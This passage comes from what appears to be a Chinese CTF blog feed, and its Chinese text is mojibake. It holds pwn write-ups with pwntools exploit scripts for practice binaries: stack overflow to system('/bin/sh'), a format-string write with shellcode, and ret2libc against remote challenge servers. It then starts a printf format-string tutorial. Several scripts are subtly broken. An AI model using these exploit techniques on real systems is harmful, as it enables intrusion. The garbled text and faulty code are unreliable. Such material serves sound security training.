systemå‡½æ•°çš„å‚æ•°ï¼Œåªè¦æŠŠnameçš„å€¼æ”¹æˆé‚£ä¸ªå€¼å°±è¡Œäº†ã€‚</p><h3 id="9-3-è„šæœ¬"><a href="#9-3-è„šæœ¬" class="headerlink" title="9.3 è„šæœ¬"></a>9.3 è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x2A</span>(<span class="hljs-string">&#x27;æå¦ˆçš„,0x26+0x4èƒ½ç»™æˆ‘ç®—æˆ0x30æ¥?&#x27;</span>) + p32(<span class="hljs-number">0x8048420</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>-&gt;sysè¿”å›åœ°å€<span class="hljs-string">&#x27; + p32(0x804A080)&#x27;</span>nameçš„åœ°å€<span class="hljs-string">&#x27;</span><br><span class="hljs-string">r = process(&#x27;</span>./cgpwn2<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>name\n<span class="hljs-string">&#x27;,&#x27;</span>/<span class="hljs-built_in">bin</span>/sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>here:\n<span class="hljs-string">&#x27;,payload)</span><br><span class="hljs-string">r.interactive()</span><br></code></pre></div></td></tr></table></figure><h2 id="10-string"><a href="#10-string" class="headerlink" title="10 string"></a>10 string</h2><h3 id="10-1-checksec"><a href="#10-1-checksec" class="headerlink" title="10.1 checksec"></a>10.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/f6NWvTAL2tYuKkr.png" alt="22"></p><h3 id="10-2-æ‰¾æ¼æ´"><a href="#10-2-æ‰¾æ¼æ´" class="headerlink" title="10.2 æ‰¾æ¼æ´"></a>10.2 æ‰¾æ¼æ´</h3><p>ä»£ç å¥½é•¿å•Šã€‚</p><img src="https://i.loli.net/2021/07/19/32uH7CzocNe4bKE.png" alt="23" style="zoom:80%;" /><p>çœ‹çœ‹func1ã€‚</p><img src="https://i.loli.net/2021/07/19/JI9wTKFP6li1gZV.png" alt="24" style="zoom: 80%;" /><p>func2ã€‚</p><img src="https://i.loli.net/2021/07/19/AscTUzQ9x1KXBR8.png" alt="25" style="zoom:80%;" /><p>æ²¡æœ‰æº¢å‡ºç‚¹ã€‚func3ã€‚</p><img src="https://i.loli.net/2021/07/19/3DxVSQvWNoB58ea.png" alt="26" style="zoom:80%;" /><p>å¥½å•¦ï¼Œæº¢å‡ºç‚¹ã€‚</p><p><img src="https://i.loli.net/2021/07/19/vAengmcpkH6dqK4.png" alt="27"></p><p>å¾ˆæ˜æ˜¾ï¼Œè®©a1æ•°ç»„çš„ç¬¬0ä½å’Œç¬¬1ä½ç›¸ç­‰ï¼ˆå°±æ˜¯85å’Œ68ï¼‰ã€‚</p><p>åé¢é‚£ä¸ªmmapæ˜¯å†…å­˜æ˜ å°„ï¼Œæ„æ€å°±æ˜¯å¡«å…¥ä¸€ä¸ªæœºå™¨ç ä½¿å¾—ç›´æ¥æ‰§è¡Œã€‚</p><h3 id="10-3-è„šæœ¬"><a href="#10-3-è„šæœ¬" class="headerlink" title="10.3 è„šæœ¬"></a>10.3 è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;%68c%7$n&#x27;</span><span class="hljs-comment"># b&#x27;a&#x27;*85 + &#x27;%7$n&#x27;ä¹Ÿæ˜¯å¯ä»¥çš„</span><br>r = process(<span class="hljs-string">&#x27;./string&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;secret[1] is &#x27;</span>)<br>a = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0x&#x27;</span>+r.recvline(),base=<span class="hljs-number">16</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name be:\n&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;up?:\n&#x27;</span>,<span class="hljs-string">&#x27;east&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;leave(0)?:\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;address&#x27;\n&quot;</span>,<span class="hljs-built_in">str</span>(a))<br>r.sendlineafter(<span class="hljs-string">&#x27;wish is:\n&#x27;</span>,payload)<br>r.sendlineafter(<span class="hljs-string">&#x27;SPELL\n&#x27;</span>,asm(shellcraft.amd64.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>))<br><span class="hljs-comment">#å½“æˆ‘ä»¬åœ¨è·å¾—ç¨‹åºçš„æ¼æ´åï¼Œå°±å¯ä»¥åœ¨ç¨‹åºçš„æ¼æ´å¤„æ‰§è¡Œç‰¹å®šçš„ä»£ç ï¼Œè€Œè¿™äº›ä»£ç ä¹Ÿå°±æ˜¯ä¿—ç§°çš„shellcodeã€‚</span><br><span class="hljs-comment">#è·å¾—æ‰§è¡Œsystem(â€œ/bin/shâ€)æ±‡ç¼–ä»£ç æ‰€å¯¹åº”çš„æœºå™¨ç ï¼š asm(shellcraft.sh()) ã€‚æ³¨æ„è¦æŒ‡æ˜archå’Œosã€‚archæœ‰</span><br><span class="hljs-comment">#i386(x86)å’Œamd64(x64)ã€‚æ”»é˜²ä¸–ç•Œçš„é¢˜è§£åŒºæœ‰äººè¯´è¿™ä¸ªå‡½æ•°å¤±æ•ˆï¼Œå…¶å®æ˜¯å› ä¸ºä»–æ²¡æŒ‡æ˜ç¯å¢ƒã€‚ä¸åŒç¯å¢ƒä¸‹çš„æ±‡ç¼–ä»£</span><br><span class="hljs-comment">#ç æ˜¯ä¸åŒçš„ã€‚</span><br>r.interactive()<br><br><span class="hljs-comment">#AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-</span><br></code></pre></div></td></tr></table></figure><h2 id="11-level3"><a href="#11-level3" class="headerlink" title="11 level3"></a>11 level3</h2><h3 id="11-1-checksec"><a href="#11-1-checksec" class="headerlink" title="11.1 checksec"></a>11.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/kwIAFZPTb5BuMfV.png" alt="28"></p><h3 id="11-2-æ‰¾æ¼æ´"><a href="#11-2-æ‰¾æ¼æ´" class="headerlink" title="11.2 æ‰¾æ¼æ´"></a>11.2 æ‰¾æ¼æ´</h3><p>å¼€IDAçœ‹çœ‹ï¼Œçœ‹åˆ°æœ‰ä¸€ä¸ªreadçš„æ ˆæº¢å‡ºã€‚</p><p><img src="https://i.loli.net/2021/07/19/4SCUlP8QLGINi7k.png" alt="29"></p><p>åªæœ‰writeå’Œreadå‡½æ•°ï¼Œé‚£åªèƒ½é€šè¿‡æ³„éœ²libcçš„åŸºå€æ¥è°ƒç”¨<code>system(&#39;/bin/sh&#39;)</code>äº†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“çš„æœ‰ï¼šwriteå‡½æ•°çš„pltè¡¨ä½ç½®å’Œgotè¡¨ä½ç½®ã€‚ç”±äºåœ¨readå‡½æ•°ä¹‹å‰å·²ç»è°ƒç”¨è¿‡writeå‡½æ•°äº†ï¼Œå³å·²ç»å®Œæˆäº†å»¶è¿Ÿç»‘å®šï¼Œé‚£ä¹ˆgotè¡¨ä¸­å·²ç»è®°å½•äº†writeçš„åœ°å€ï¼Œç”±äºlibcçš„å‡½æ•°åç§»å€¼æ˜¯å›ºå®šçš„ï¼Œåˆ™å¯ä»¥è·å¾—libcçš„åŸºå€ï¼Œå¹¶å¾—åˆ°systemå‡½æ•°çš„å®é™…åœ°å€ã€‚</p><h3 id="11-3-è„šæœ¬"><a href="#11-3-è„šæœ¬" class="headerlink" title="11.3 è„šæœ¬"></a>11.3 è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>aaaa<br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>DEBUG = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> DEBUG == <span class="hljs-number">1</span>:<br>p = process(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>,<span class="hljs-number">56008</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(write_plt)  + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#ä»è¿™é‡Œè·³è½¬åˆ°writeå‡½æ•°ä¸­,é»˜è®¤å½“å‰æ ˆé¡¶å°±æ˜¯è¿”å›åœ°å€,ä¸‹é¢çš„ä¾æ¬¡æ˜¯å‚æ•°1-n(å…ˆå‹å‚æ•°å†è¿”å›åœ°å€)</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>p.sendline(payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<span class="hljs-comment">#unpack() è¿™é‡Œæ˜¯writeå‡½æ•°è¾“å‡ºçš„got</span><br><br><span class="hljs-comment">#print(hex(write_addr))</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<span class="hljs-comment">#é‡æ–°è¿›å…¥mainå‡½æ•°</span><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr = (write_addr - write_libc)<span class="hljs-string">&#x27;&#x27;&#x27;è¿™ç©æ„å„¿æ˜¯åŸºå€&#x27;&#x27;&#x27;</span> + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = (write_addr - write_libc) + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(system_addr) + p32(main_addr) + p32(binsh_addr) <br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;111.200.241.244&#x27;</span>, <span class="hljs-number">63933</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = write_addr - write_libc + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh_addr = write_addr - write_libc + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(sys_addr) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + sh_addr<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwné¢˜:æ ¼å¼åŒ–è¾“å‡ºå­—ç¬¦ä¸²æ¼æ´</title>
    <link href="/2021-07/pwn-start-ctf-pwn1/"/>
    <url>/2021-07/pwn-start-ctf-pwn1/</url>
    
    <content type="html"><![CDATA[<h1 id="pwnï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#pwnï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="pwnï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>pwnï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h1><p>CTFâ€”â€”PWNçš„åŸºç¡€æ¼æ´ç±»å‹ã€‚ </p><h2 id="1-printfå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#1-printfå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="1 printfå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>1 printfå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><h3 id="1-1-printfå‡½æ•°"><a href="#1-1-printfå‡½æ•°" class="headerlink" title="1.1 printfå‡½æ•°"></a>1.1 printfå‡½æ•°</h3><p>printf()å‡½æ•°æ˜¯æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°, ä¸€èˆ¬ç”¨äºå‘å‡†åˆ™è¾“å‡ºè®¾å¤‡æŒ‰è§„å®šå¼æ ·è¾“å‡ºæ¶ˆæ¯ã€‚<br>å‡½æ•°çš„åŸå‹ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br></code></pre></div></td></tr></table></figure><p>printf()å‡½æ•°çš„è°ƒç”¨æ ¼å¼ä¸º:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&lt;æ ¼å¼åŒ–å­—ç¬¦ä¸²&gt;&quot;</span>, &lt;å‚é‡è¡¨&gt;);<br></code></pre></div></td></tr></table></figure><p>å…¶ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²åŒ…æ‹¬ä¸¤éƒ¨åˆ†å†…å®¹: ä¸€éƒ¨åˆ†æ˜¯æ­£å¸¸å­—ç¬¦, è¿™äº›å­—ç¬¦å°†æŒ‰åŸæ ·è¾“å‡º; å¦ä¸€éƒ¨åˆ†æ˜¯æ ¼å¼åŒ–è§„å®šå­—ç¬¦, ä»¥â€%â€å¼€å§‹, åè·Ÿä¸€ä¸ªæˆ–å‡ ä¸ªè§„å®šå­—ç¬¦,ç”¨æ¥ç¡®å®šè¾“å‡ºå†…å®¹æ ¼å¼ã€‚å‚é‡è¡¨æ˜¯éœ€è¦è¾“å‡ºçš„ä¸€ç³»åˆ—å‚æ•°, å…¶ä¸ªæ•°å¿…é¡»ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€è¯´æ˜çš„è¾“å‡ºå‚æ•°ä¸ªæ•°ä¸€æ ·å¤š, å„å‚æ•°ä¹‹é—´ç”¨â€,â€åˆ†å¼€, ä¸”é¡ºåºä¸€ä¸€å¯¹åº”, å¦åˆ™å°†ä¼šå‡ºç°æ„æƒ³ä¸åˆ°çš„é”™è¯¯ã€‚</p><p>printf()å‡½æ•°çš„å¤§å®¶æ—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">snprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vprintf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vdprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsnprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_lis t ap)</span></span>;<br></code></pre></div></td></tr></table></figure><ul><li>fprintf()æŒ‰ç…§æ ¼å¼å­—ç¬¦ä¸²çš„å†…å®¹å°†è¾“å‡ºå†™å…¥æµä¸­ã€‚ä¸‰ä¸ªå‚æ•°ä¸ºæµã€æ ¼å¼å­—ç¬¦ä¸²å’Œå˜å‚åˆ—è¡¨ã€‚</li><li>printf()ç­‰åŒäºfprintf()ï¼Œä½†æ˜¯å®ƒå‡å®šè¾“å‡ºæµä¸ºstdoutã€‚ </li><li>sprintf()ç­‰åŒäºfprintf()ï¼Œä½†æ˜¯è¾“å‡ºä¸æ˜¯å†™å…¥æµè€Œæ˜¯å†™å…¥æ•°ç»„ã€‚åœ¨å†™å…¥çš„å­—ç¬¦ä¸²æœ«å°¾å¿…é¡»æ·»åŠ ä¸€ä¸ªç©ºå­—ç¬¦ã€‚</li><li>snprintf()ç­‰åŒäºsprintf()ï¼Œä½†æ˜¯å®ƒæŒ‡å®šäº†å¯å†™å…¥å­—ç¬¦çš„æœ€å¤§å€¼sizeã€‚å½“sizeå¤§äºé›¶æ—¶ï¼Œè¾“å‡ºå­—ç¬¦è¶…è¿‡ç¬¬size-1çš„éƒ¨åˆ†ä¼šè¢«èˆå¼ƒè€Œ ä¸ä¼šå†™å…¥æ•°ç»„ä¸­ï¼Œåœ¨å†™å…¥æ•°ç»„çš„å­—ç¬¦ä¸²æœ«å°¾ä¼šæ·»åŠ ä¸€ä¸ªç©ºå­—ç¬¦ã€‚</li><li>dprintf()ç­‰åŒäºfprintf()ï¼Œä½†æ˜¯å®ƒè¾“å‡ºä¸æ˜¯æµè€Œæ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦fd ã€‚</li><li>vfprintf()ã€vprintf()ã€vsprintf()ã€vsnprintf()ã€vdprintf()åˆ†åˆ«ä¸ä¸Šé¢çš„å‡½æ•°å¯¹åº”ï¼Œåªæ˜¯å®ƒä»¬å°†å˜å‚åˆ—è¡¨æ¢æˆäº†va_listç±»å‹çš„å‚æ•°ã€‚</li></ul><h3 id="1-2-æ ¼å¼å­—ç¬¦ä¸²format"><a href="#1-2-æ ¼å¼å­—ç¬¦ä¸²format" class="headerlink" title="1.2 æ ¼å¼å­—ç¬¦ä¸²format"></a>1.2 æ ¼å¼å­—ç¬¦ä¸²format</h3><p>æ ¼å¼å­—ç¬¦ä¸²æ˜¯ç”±æ™®é€šå­—ç¬¦ï¼ˆordinary characterï¼ŒåŒ…æ‹¬ % ï¼‰å’Œè½¬æ¢è§„åˆ™ï¼ˆconversion specificationï¼‰æ„æˆçš„å­—ç¬¦åºåˆ—ã€‚æ™®é€šå­—ç¬¦è¢«åŸå°ä¸åŠ¨åœ°å¤åˆ¶åˆ°è¾“å‡ºæµä¸­ã€‚è½¬æ¢è§„åˆ™æ ¹æ®ä¸å®å‚å¯¹åº”çš„è½¬æ¢æŒ‡ç¤ºç¬¦å¯¹å…¶è¿›è¡Œè½¬æ¢ï¼Œç„¶åå°†ç»“æœå†™å…¥è¾“å‡ºæµä¸­ã€‚<br>ä¸€ä¸ªè½¬æ¢è§„åˆ™æœ‰å¯é€‰éƒ¨åˆ†å’Œå¿…éœ€éƒ¨åˆ†ç»„æˆï¼š</p><div class="hljs code-wrapper"><pre><code>%[ å‚æ•° ][ æ ‡å¿— ][ å®½åº¦ ][ .ç²¾åº¦ ][ é•¿åº¦ ] è½¬æ¢æŒ‡ç¤ºç¬¦</code></pre></div><ul><li>ï¼ˆå¿…éœ€ï¼‰è½¬æ¢æŒ‡ç¤ºç¬¦ï¼š</li></ul><table><thead><tr><th>å­—ç¬¦</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td>d,i</td><td align="left">æœ‰ç¬¦å·åè¿›åˆ¶æ•°å€¼<code>int</code>ã€‚<code>%d</code> ä¸<code>%i </code>å¯¹äºè¾“å‡ºæ˜¯åŒä¹‰ï¼›ä½†å¯¹äº<code>scanf()</code>è¾“å…¥äºŒè€…ä¸åŒï¼Œå…¶ä¸­<code>%i</code>åœ¨è¾“å…¥å€¼æœ‰å‰ç¼€<code>0x</code>æˆ–<code>0</code>æ—¶ï¼Œåˆ†åˆ«è¡¨ç¤º16è¿›åˆ¶æˆ–8è¿›åˆ¶çš„å€¼ã€‚å¦‚æœæŒ‡å®šäº†ç²¾åº¦ï¼Œåˆ™è¾“å‡ºçš„æ•°å­—ä¸è¶³æ—¶åœ¨å·¦ä¾§è¡¥0ã€‚é»˜è®¤ç²¾åº¦ä¸º1ã€‚ç²¾åº¦ä¸º0ä¸”å€¼ä¸º0ï¼Œåˆ™è¾“å‡ºä¸ºç©ºã€‚</td></tr><tr><td>u</td><td align="left">åè¿›åˆ¶<code>unsigned int</code>ã€‚å¦‚æœæŒ‡å®šäº†ç²¾åº¦ï¼Œåˆ™è¾“å‡ºçš„æ•°å­—ä¸è¶³æ—¶åœ¨å·¦ä¾§è¡¥0ã€‚é»˜è®¤ç²¾åº¦ä¸º1ã€‚ç²¾åº¦ä¸º0ä¸”å€¼ä¸º0ï¼Œåˆ™è¾“å‡ºä¸ºç©ºã€‚</td></tr><tr><td>f,F</td><td align="left"><code>double</code>å‹è¾“å‡º10è¿›åˆ¶å®šç‚¹è¡¨ç¤ºã€‚<code>f </code>ä¸ <code>F</code> å·®å¼‚æ˜¯è¡¨ç¤ºæ— ç©·ä¸NaNæ—¶ï¼Œ<code>f</code>è¾“å‡º<code>inf</code>, <code>infinity</code>ä¸ <code>nan</code>ï¼›<code>F</code> è¾“å‡º<code>INF</code>, <code>INFINITY</code>ä¸<code>NAN</code>ã€‚å°æ•°ç‚¹åçš„æ•°å­—ä½æ•°ç­‰äºç²¾åº¦ï¼Œæœ€åä¸€ä½æ•°å­—å››èˆäº”å…¥ã€‚ç²¾åº¦é»˜è®¤ä¸º6ã€‚å¦‚æœç²¾åº¦ä¸º0ä¸”æ²¡æœ‰#æ ‡è®°ï¼Œåˆ™ä¸å‡ºç°å°æ•°ç‚¹ã€‚å°æ•°ç‚¹å·¦ä¾§è‡³å°‘ä¸€ä½æ•°å­—ã€‚</td></tr><tr><td>e,E</td><td align="left"><code>double</code>å€¼ï¼Œè¾“å‡ºå½¢å¼ä¸º10è¿›åˆ¶çš„<code>([ - ]d.ddd e [ + / - ]ddd)</code>. Eç‰ˆæœ¬ä½¿ç”¨çš„æŒ‡æ•°ç¬¦å·ä¸º<code>E</code>ï¼ˆè€Œä¸æ˜¯<code>e</code>ï¼‰ã€‚æŒ‡æ•°éƒ¨åˆ†è‡³å°‘åŒ…å«2ä½æ•°å­—ï¼Œå¦‚æœå€¼ä¸º0ï¼Œåˆ™æŒ‡æ•°éƒ¨åˆ†ä¸º00ã€‚Windowsç³»ç»Ÿï¼ŒæŒ‡æ•°éƒ¨åˆ†è‡³å°‘ä¸º3ä½æ•°å­—ï¼Œä¾‹å¦‚1.5e002ï¼Œä¹Ÿå¯ç”¨Microsoftç‰ˆçš„è¿è¡Œæ—¶å‡½æ•°<code>_set_output_format</code>ä¿®æ”¹ã€‚å°æ•°ç‚¹å‰å­˜åœ¨1ä½æ•°å­—ã€‚å°æ•°ç‚¹åçš„æ•°å­—ä½æ•°ç­‰äºç²¾åº¦ã€‚ç²¾åº¦é»˜è®¤ä¸º6ã€‚å¦‚æœç²¾åº¦ä¸º0ä¸”æ²¡æœ‰#æ ‡è®°ï¼Œåˆ™ä¸å‡ºç°å°æ•°ç‚¹ã€‚</td></tr><tr><td>g,G</td><td 